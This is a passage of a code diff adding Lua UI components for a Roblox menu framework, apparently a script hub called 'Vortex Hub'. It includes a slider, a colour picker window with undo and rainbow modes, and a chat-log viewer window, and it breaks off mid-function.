+      TextColor3 = framework.menuSettings.textColor,
+      TextXAlignment = Enum.TextXAlignment.Left
+    })
+  
+    if option.min >= 0 then
+      slider.Size = UDim2.new((option.value - option.min) / (option.max - option.min), 0, 1, 0)
     else
-      framework:sendNotification("Invalid key")
-      while true do
+      slider.Position = UDim2.new((0 - option.min) / (option.max - option.min), 0, 0, 0)
+      slider.Size = UDim2.new(option.value / (option.max - option.min), 0, 1, 0)
+    end
+  
+    local sliding
+  
+    main.InputBegan:connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                sliding = true
+                option:SetState(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
+            end
+      end)
+  
+    inputService.InputChanged:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement and sliding then
+        option:SetState(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
+      end
+    end)
+  
+    main.InputEnded:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        sliding = false
+      end
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inputvalue:ReleaseFocus()
+      end
+    end)
+  
+    inputvalue.FocusLost:connect(function()
+      option:SetState(tonumber(inputvalue.Text) or option.value)
+    end)
+  
+    function option:SetState(value)
+      value = round(value, option.float)
+      value = math.clamp(value, self.min, self.max)
+      if self.min >= 0 then
+        slider:TweenSize(UDim2.new((value - self.min) / (self.max - self.min), 0, 0, 18), "Out", "Quad", 0.1, true)
+      else
+        slider:TweenPosition(UDim2.new((0 - self.min) / (self.max - self.min), 0, 0, 0), "Out", "Quad", 0.1, true)
+        slider:TweenSize(UDim2.new(value / (self.max - self.min), 0, 0, 18), "Out", "Quad", 0.1, true)
+      end
+      framework.flags[self.flag] = value
+      self.value = value
+      inputvalue.Text = value
+      self.callback(value)
+    end
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      if not sliding then
+        main.BackgroundColor3 = framework.menuSettings.secondaryColour
+        slider.BackgroundColor3 = framework.menuSettings.mainColour
+      end
+      inputvalue.TextSize = framework.menuSettings.textSize
+      inputvalue.Font = framework.menuSettings.font
+      inputvalue.TextColor3 = framework.menuSettings.textColor
+      title.TextSize = framework.menuSettings.textSize
+      title.Font = framework.menuSettings.font
+      title.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  local function createColourPickerWindow(option)
+    option.topBar = framework:Create("ImageLabel", {
+      Parent = framework.base,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 284, 0, 30),
+      Position = UDim2.new(0, 0, 0, 0),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = framework.menuSettings.mainColour,
+      BorderColor3 = framework.menuSettings.secondaryColour,
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      SliceScale = 0.08
+    })
+  
+    option.close = framework:Create("TextLabel", {
+      Parent = option.topBar,
+      BackgroundTransparency = 1,
+      TextSize = framework.menuSettings.textSize,
+      Text = "X",
+      TextColor3 = framework.menuSettings.textColor,
+      Font = framework.menuSettings.font,
+      Position = UDim2.new(0.900, 0, 0, 0),
+      Size = UDim2.new(0, 35, 0, 19)
+    })
+  
+    local titleName = framework:Create("TextLabel", {
+      Parent = option.topBar,
+      BackgroundTransparency = 1,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      Text = option.text.." Picker",
+      Size = UDim2.new(0, 282, 0, 19),
+      Position = UDim2.new(0, 0, 0, 0),
+      Font = framework.menuSettings.font,
+      TextSize = 16
+    })
+  
+    local hue, sat, val = Color3.toHSV(option.color)
+    hue, sat, val = hue == 0 and 1 or hue, sat + 0.005, val - 0.005
+    local editinghue
+      local editingsatval
+      local currentColor = option.color
+      local previousColors = {[1] = option.color}
+      local originalColor = option.color
+      local rainbowEnabled
+      local rainbowLoop
+  
+    function option:updateVisuals(Color)
+            currentColor = Color
+            self.visualize2.ImageColor3 = Color
+            hue, sat, val = Color3.toHSV(Color)
+            hue = hue == 0 and 1 or hue
+            self.satval.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
+            self.hueSlider.Position = UDim2.new(1 - hue, 0, 0, 0)
+            self.satvalSlider.Position = UDim2.new(sat, 0, 1 - val, 0)
+      end
+  
+    option.mainHolder = framework:Create("ImageLabel", {
+      Parent = option.topBar,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 284, 0, 199),
+      Position = UDim2.new(-0, 0, 0.639, 0),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = Color3.fromRGB(10, 10, 10),
+      BorderColor3 = framework.menuSettings.secondaryColour,
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      SliceScale = 0.04
+    })
+    local connectorPart = framework:Create("Frame", {
+      Parent = option.mainHolder,
+      BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+      BorderSizePixel = 0,
+      Position = UDim2.new(-0, 0, -0.002, 0),
+      Size = UDim2.new(0, 284, 0, 22),
+    })
+    option.resetColour = framework:Create("TextLabel", {
+      Parent = option.mainHolder,
+      Text = "Reset",
+      Font = framework.menuSettings.font,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Size = UDim2.new(0, 72, 0, 15),
+      Position = UDim2.new(0.714, 0, 0.535, 0)
+    })
+    option.undoColour = framework:Create("TextLabel", {
+      Parent = option.mainHolder,
+      Text = "Undo",
+      Font = framework.menuSettings.font,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Size = UDim2.new(0, 72, 0, 15),
+      Position = UDim2.new(0.714, 0, 0.644, 0)
+    })
+    option.setColour = framework:Create("TextLabel", {
+      Parent = option.mainHolder,
+      Text = "Set",
+      Font = framework.menuSettings.font,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Size = UDim2.new(0, 72, 0, 15),
+      Position = UDim2.new(0.714, 0, 0.758, 0)
+    })
+    option.rainbowColour = framework:Create("TextLabel", {
+      Parent = option.mainHolder,
+      Text = "Rainbow",
+      Font = framework.menuSettings.font,
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = 16,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Size = UDim2.new(0, 72, 0, 15),
+      Position = UDim2.new(0.714, 0, 0.863, 0)
+    })
+    option.satval = framework:Create("ImageLabel", {
+            ZIndex = 3,
+            Position = UDim2.new(0, 8, 0, 7),
+            Size = UDim2.new(0.973, -100, 0.93, -42),
+            BackgroundColor3 = Color3.fromHSV(hue, 1, 1),
+            BorderSizePixel = 0,
+            Image = "rbxassetid://4155801252",
+            ClipsDescendants = true,
+            Parent = option.mainHolder
+      })
+      option.satvalSlider = framework:Create("Frame", {
+      Parent = option.satval,
+          ZIndex = 3,
+          AnchorPoint = Vector2.new(0.5, 0.5),
+          Position = UDim2.new(sat, 0, 1 - val, 0),
+          Size = UDim2.new(0, 4, 0, 4),
+          Rotation = 45,
+          BackgroundTransparency = 0,
+          BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+      })
+    option.hue = framework:Create("ImageLabel", {
+      Parent = option.mainHolder,
+      ZIndex = 3,
+      AnchorPoint = Vector2.new(0, 1),
+      Position = UDim2.new(0, 8, 1, -8),
+      Size = UDim2.new(0.973, -100, 0, 22),
+      BackgroundTransparency = 1,
+      Image = "rbxassetid://3570695787",
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      SliceScale = 0.02,
+    })
+    local Gradient = framework:Create("UIGradient", {
+      Parent = option.hue,
+      Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+        ColorSequenceKeypoint.new(0.157, Color3.fromRGB(255, 0, 255)),
+        ColorSequenceKeypoint.new(0.323, Color3.fromRGB(0, 0, 255)),
+        ColorSequenceKeypoint.new(0.488, Color3.fromRGB(0, 255, 255)),
+        ColorSequenceKeypoint.new(0.66, Color3.fromRGB(0, 255, 0)),
+        ColorSequenceKeypoint.new(0.817, Color3.fromRGB(255, 255, 0)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)),
+      })
+    })
+    option.hueSlider = framework:Create("Frame", {
+      Parent = option.hue,
+      ZIndex = 3,
+      Position = UDim2.new(1 - hue, 0, 0, 0),
+      Size = UDim2.new(0, 2, 1, 0),
+      BackgroundTransparency = 0,
+      BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+    })
+    option.visualize2 = framework:Create("ImageLabel", {
+      Parent = option.mainHolder,
+      ZIndex = 3,
+      Position = UDim2.new(1.007, -8, -0.005, 8),
+      Size = UDim2.new(0, -80, 0, 80),
+      BackgroundTransparency = 1,
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = currentColor,
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+      SliceScale = 0.02,
+    })
+  
+    local inContactresetColour = false
+    local inContactrainbowColour = false
+    local inContactsetColour = false
+    local inContactundoColour = false
+  
+    option.hue.InputBegan:connect(function(Input)
+            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+                editinghue = true
+                X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
+                X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
+                X = X < 0 and 0 or X > 0.995 and 0.995 or X
+                option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
+            end
+      end)
+  
+      inputService.InputChanged:connect(function(Input)
+          if Input.UserInputType == Enum.UserInputType.MouseMovement and editinghue then
+              X = (option.hue.AbsolutePosition.X + option.hue.AbsoluteSize.X) - option.hue.AbsolutePosition.X
+              X = (Input.Position.X - option.hue.AbsolutePosition.X) / X
+              X = X <= 0 and 0 or X >= 0.995 and 0.995 or X
+              option:updateVisuals(Color3.fromHSV(1 - X, sat, val))
+          end
+      end)
+  
+      option.hue.InputEnded:connect(function(Input)
+          if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+              editinghue = false
+          end
+      end)
+  
+    option.satval.InputBegan:connect(function(Input)
+            if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+                editingsatval = true
+                X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
+                Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
+                X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
+                Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
+                X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
+                Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
+                option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
+            end
+      end)
+  
+      inputService.InputChanged:connect(function(Input)
+          if Input.UserInputType == Enum.UserInputType.MouseMovement and editingsatval then
+              X = (option.satval.AbsolutePosition.X + option.satval.AbsoluteSize.X) - option.satval.AbsolutePosition.X
+              Y = (option.satval.AbsolutePosition.Y + option.satval.AbsoluteSize.Y) - option.satval.AbsolutePosition.Y
+              X = (Input.Position.X - option.satval.AbsolutePosition.X) / X
+              Y = (Input.Position.Y - option.satval.AbsolutePosition.Y) / Y
+              X = X <= 0.005 and 0.005 or X >= 1 and 1 or X
+              Y = Y <= 0 and 0 or Y >= 0.995 and 0.995 or Y
+              option:updateVisuals(Color3.fromHSV(hue, X, 1 - Y))
+          end
+      end)
+  
+      option.satval.InputEnded:connect(function(Input)
+          if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+              editingsatval = false
+          end
+      end)
+  
+    option.resetColour.InputBegan:connect(function(Input)
+            if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
+                previousColors = {originalColor}
+                option:SetColor(originalColor)
+            end
+            if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactresetColour = true
+          tweenService:Create(option.resetColor, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+            end
+      end)
+  
+      option.resetColour.InputEnded:connect(function(Input)
+            if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactresetColour = false
+          tweenService:Create(option.resetColor, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+            end
+      end)
+  
+    option.undoColour.InputBegan:connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
+          local Num = #previousColors == 1 and 0 or 1
+          option:SetColor(previousColors[#previousColors - Num])
+          if #previousColors ~= 1 then
+            table.remove(previousColors, #previousColors)
+          end
+        end
+        if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactundoColour = true
+          tweenService:Create(option.undoColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+        end
+    end)
+  
+    option.undoColour.InputEnded:connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactundoColour = false
+          tweenService:Create(option.undoColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+        end
+    end)
+  
+    option.setColour.InputBegan:connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseButton1 and not rainbowEnabled then
+          table.insert(previousColors, currentColor)
+          option:SetColor(currentColor)
+        end
+        if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactsetColour = true
+          tweenService:Create(option.setColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+        end
+    end)
+  
+    option.setColour.InputEnded:connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactsetColour = false
+          tweenService:Create(option.setColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+        end
+    end)
+  
+    option.rainbowColour.InputBegan:connect(function(Input)
+      if Input.UserInputType == Enum.UserInputType.MouseButton1 then
+        rainbowEnabled = not rainbowEnabled
+        if rainbowEnabled then
+          rainbowLoop = runService.Heartbeat:connect(function()
+            option:SetColor(chromaColor)
+            option.rainbowColour.TextColor3 = chromaColor
+          end)
+        else
+          rainbowLoop:Disconnect()
+          option:SetColor(previousColors[#previousColors])
+          option.rainbowColour.TextColor3 = Color3.fromRGB(255, 255, 255)
+        end
+      end
+      if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+        inContactrainbowColour = true
+        tweenService:Create(option.rainbowColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+      end
+    end)
+  
+    option.rainbowColour.InputEnded:connect(function(Input)
+        if Input.UserInputType == Enum.UserInputType.MouseMovement and not dragging then
+          inContactrainbowColour = false
+          tweenService:Create(option.rainbowColour, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+        end
+    end)
+  
+    option.close.InputBegan:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        option:Close()
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        tweenService:Create(option.close, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.secondaryColour}):Play()
+      end
+    end)
+  
+    option.close.InputEnded:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        tweenService:Create(option.close, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+      end
+    end)
+  
+    dragify(option.topBar)
+    option.topBar.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragify(option.topBar)
+      end
+    end)
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      option.topBar.ImageColor3 = framework.menuSettings.mainColour
+      titleName.Font = framework.menuSettings.font
+      titleName.TextColor3 = framework.menuSettings.textColor
+      titleName.TextSize = framework.menuSettings.titleSize
+      option.resetColour.TextSize = framework.menuSettings.textSize
+      option.resetColour.Font = framework.menuSettings.font
+      option.resetColour.TextColor3 = framework.menuSettings.textColor
+      option.rainbowColour.TextSize = framework.menuSettings.textSize
+      option.rainbowColour.Font = framework.menuSettings.font
+      option.rainbowColour.TextColor3 = framework.menuSettings.textColor
+      option.undoColour.TextSize = framework.menuSettings.textSize
+      option.undoColour.Font = framework.menuSettings.font
+      option.undoColour.TextColor3 = framework.menuSettings.textColor
+      option.setColour.TextSize = framework.menuSettings.textSize
+      option.setColour.Font = framework.menuSettings.font
+      option.setColour.TextColor3 = framework.menuSettings.textColor
+      if inContactundoColour == false then
+        option.undoColour.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+      if not inContactsetColour == false then
+        option.setColour.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+      if inContactrainbowColour == false then
+        option.rainbowColour.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+      if inContactresetColour == false then
+        option.resetColour.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+    return option
+  end
+  
+  local function createColourPicker(option, parent, holder)
+    local mainmainHolder = framework:Create("Frame", {
+      Parent = parent.main,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 163, 0, 33),
+    })
+    option.visualize = framework:Create("ImageLabel", {
+      Parent = mainmainHolder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 60, 0, 25),
+      Position = UDim2.new(0.816, 0, -0.051, 0),
+      Image = "rbxassetid://3570695787",
+          ImageColor3 = option.color,
+          ScaleType = Enum.ScaleType.Slice,
+          SliceCenter = Rect.new(100, 100, 100, 100),
+          SliceScale = 0.08,
+    })
+    option.main = framework:Create("TextLabel", {
+      Parent = mainmainHolder,
+      BackgroundTransparency = 1,
+      TextSize = 15,
+      Text = option.text,
+      TextColor3 = framework.menuSettings.textColor,
+      Font = framework.menuSettings.font,
+      TextXAlignment = Enum.TextXAlignment.Left,
+      Position = UDim2.new(0.033, 0, -0.04, 0),
+      Size = UDim2.new(0, 129, 0, 25),
+    })
+  
+    local inContact
+    option.main.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                if not option.topBar then createColourPickerWindow(option) end
+                if framework.activePopup then
+                    framework.activePopup:Close()
+                end
+                option.open = true
+                option.topBar.Visible = true
+                framework.activePopup = option
+        elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+          inContact = true
+          option.main.TextColor3 = framework.menuSettings.mainColour
+          end
+    end)
+  
+    option.visualize.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+          if not option.topBar then createColourPickerWindow(option) end
+          if framework.activePopup then
+            framework.activePopup:Close()
+          end
+          option.open = true
+          option.topBar.Visible = true
+          framework.activePopup = option
+        elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+          inContact = true
+          option.main.TextColor3 = framework.menuSettings.mainColour
+      end
+    end)
+  
+    option.main.InputEnded:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = false
+          option.main.TextColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+  
+    option.visualize.InputEnded:connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = false
+          option.main.TextColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+  
+    function option:SetColor(newColor)
+      if option.topBar then
+        option:updateVisuals(newColor)
+      end
+      option.visualize.ImageColor3 = newColor
+      framework.flags[self.flag] = newColor
+      option.color = newColor
+      option.callback(newColor)
+    end
+  
+    function option:Close()
+      framework.activePopup = nil
+      self.open = false
+      option.topBar.Visible = false
+    end
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
+      --local position = option.main.AbsolutePosition
+      --option.topBar.Position = UDim2.new(0, position.X+510, 0, position.Y + 35)
+      option.main.Font = framework.menuSettings.font
+      option.main.TextColor3 = framework.menuSettings.textColor
+    end)
+  end
+  
+  function framework:createChatLoggerWindow()
+    if framework.base:FindFirstChild("エブリ") then
+      return
+    end
+    local holder = framework:Create("ImageLabel", {
+      Parent = framework.base,
+      Name = "エブリ",
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0, 0, 0, 0),
+      Size = UDim2.new(0, 350, 0, 30),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = framework.menuSettings.mainColour,
+      ScaleType = Enum.ScaleType.Slice,
+      SliceScale = 0.05,
+      SliceCenter = Rect.new(100, 100, 100, 100)
+    })
+    local mainHolder = framework:Create("ImageLabel", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(-0, 0, 0.639, 0),
+      Size = UDim2.new(0, 350, 0, 223),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = Color3.fromRGB(15, 15, 15),
+      ScaleType = Enum.ScaleType.Slice,
+      SliceScale = 0.03,
+      SliceCenter = Rect.new(100, 100, 100, 100)
+    })
+    local title = framework:Create("TextLabel", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 350, 0, 19),
+      Position = UDim2.new(0, 0, 0, 0),
+      Text = "Vortex Hub Chatlogs",
+      Font = framework.menuSettings.font,
+      TextColor3 = framework.menuSettings.textColor,
+      TextSize = framework.menuSettings.titleSize
+    })
+    local connector = framework:Create("Frame", {
+      Parent = mainHolder,
+      BackgroundColor3 = Color3.fromRGB(15, 15, 15),
+      BorderSizePixel = 0,
+      Position = UDim2.new(-0, 0, -0.002, 0),
+      Size = UDim2.new(0, 350, 0, 22)
+    })
+    local mainFrame = framework:Create("ScrollingFrame", {
+      Parent = mainHolder,
+      BackgroundColor3 = Color3.fromRGB(20, 20, 20),
+      BorderColor3 = framework.menuSettings.mainColour,
+      BorderSizePixel = 2,
+      Position = UDim2.new(0.032, 0, 0.036, 0),
+      Size = UDim2.new(0, 318, 0, 168),
+      ScrollBarImageColor3 = framework.menuSettings.mainColour,
+      ScrollBarThickness = 5,
+      CanvasSize = UDim2.new(0, 0, 0, 0)
+    })
+    local layout = framework:Create("UIListLayout", {
+      Parent = mainFrame
+    })
+    local clear = framework:Create("TextLabel", {
+      Parent = mainHolder,
+      Position = UDim2.new(0.37, 0, 0.845, 0),
+      Size = UDim2.new(0, 70, 0, 18),
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Text = "Clear",
+      Font = framework.menuSettings.font,
+      TextSize = framework.menuSettings.textSize,
+      TextColor3 = framework.menuSettings.textColor
+    })
+    local save = framework:Create("TextLabel", {
+      Parent = mainHolder,
+      Position = UDim2.new(0.622, 0, 0.845, 0),
+      Size = UDim2.new(0, 70, 0, 18),
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      Text = "Save",
+      Font = framework.menuSettings.font,
+      TextSize = framework.menuSettings.textSize,
+      TextColor3 = framework.menuSettings.textColor
+    })
+    local toggleHolder = framework:Create("Frame", {
+      Parent = mainHolder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 163, 0, 25),
+      Position = UDim2.new(0.02, 0, 0.835, 0)
+    })
+    local checkBoxHolder = framework:Create("Frame", {
+      Parent = toggleHolder,
+      BackgroundColor3 = framework.menuSettings.secondaryColour,
+      BorderColor3 = Color3.fromRGB(255, 255, 255),
+      BorderSizePixel = 1,
+      Size = UDim2.new(0, 20, 0, 20),
+      Position = UDim2.new(0.037, 0, 0.08, 0),
+    })
+    local checkmark = framework:Create("ImageLabel", {
+      Parent = toggleHolder,
+      BackgroundTransparency = 1,
+      Visible = true,
+      Image = "http://www.roblox.com/asset/?id=5226924982",
+      ImageColor3 = framework.menuSettings.mainColour,
+      ScaleType = Enum.ScaleType.Stretch,
+      Position = UDim2.new(0, 6, 0, 5),
+      Size = UDim2.new(0, 20, 0, 20)
+    })
+    local logging = framework:Create("TextLabel", {
+      Parent = toggleHolder,
+      BackgroundTransparency = 1,
+      TextSize = 15,
+      Text = "Logging",
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      Font = framework.menuSettings.font,
+      TextXAlignment = Enum.TextXAlignment.Left,
+      Position = UDim2.new(0.241, 0, -0.04, 0),
+      Size = UDim2.new(0, 129, 0, 25)
+    })
+    local close = framework:Create("TextLabel", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 20, 0, 20),
+      Position = UDim2.new(0.94, 0, -0.067, 0),
+      Text = "X",
+      Font = framework.menuSettings.font,
+      TextColor3 = framework.menuSettings.textColor,
+      TextSize = framework.menuSettings.titleSize
+    })
+    dragify(holder)
+    local inContactclear = false
+    local inContactsave = false
+    close.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        holder:Destroy()
+        dragify(self.base.holder)
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        close.TextColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+    close.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        close.TextColor3 = Color3.fromRGB(255, 255, 255)
+      end
+    end)
+    clear.InputBegan:Connect(function(input)
+      inContactclear = true
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        for i,v in pairs(mainFrame:GetChildren()) do
+          if v:IsA("TextLabel") then
+            v:Destroy()
+          end
+        end
+        mainFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+        mainFrame.CanvasPosition = Vector2.new(0, 0)
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        clear.BackgroundColor3 = framework.menuSettings.mainColour
+      end
+    end)
+    clear.InputEnded:Connect(function(input)
+      inContactclear = false
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        clear.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+    save.InputBegan:Connect(function(input)
+      inContactsave = true
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+  
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        save.BackgroundColor3 = framework.menuSettings.mainColour
+      end
+    end)
+    save.InputEnded:Connect(function(input)
+      inContactsave = false
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        save.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+    holder.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragify(holder)
+      end
+    end)
+    checkBoxHolder.InputBegan:Connect(function(input)
+      inContactcheckBox = true
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        framework.flags.chatLogs = not framework.flags.chatLogs
+        checkmark.Visible = framework.flags.chatLogs
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.mainColour
+        checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
+      end
+    end)
+    checkBoxHolder.InputEnded:Connect(function(input)
+      inContactcheckBox = false
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.textColor
+        checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
+      end
+    end)
+    logging.InputBegan:Connect(function(input)
+      inContactcheckBox = true
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        framework.flags.chatLogs = not framework.flags.chatLogs
+        checkmark.Visible = framework.flags.chatLogs
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.mainColour
+        checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
+      end
+    end)
+    logging.InputEnded:Connect(function(input)
+      inContactcheckBox = false
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.textColor
+        checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
+      end
+    end)
+    checkmark.InputBegan:Connect(function(input)
+      inContactcheckBox = true
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        framework.flags.chatLogs = not framework.flags.chatLogs
+        checkmark.Visible = framework.flags.chatLogs
+      elseif input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.mainColour
+        checkBoxHolder.BorderColor3 = framework.menuSettings.mainColour
+      end
+    end)
+    checkmark.InputEnded:Connect(function(input)
+      inContactcheckBox = false
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        logging.TextColor3 = framework.menuSettings.textColor
+        checkBoxHolder.BorderColor3 = Color3.fromRGB(255, 255, 255)
+      end
+    end)
+    local lastMessage = nil
+    local lastLabel = nil
+    local dupeCount = 1
+    local function createLogLabel(name, txt)
+      if lastMessage == name..txt then
+        dupeCount = dupeCount+1
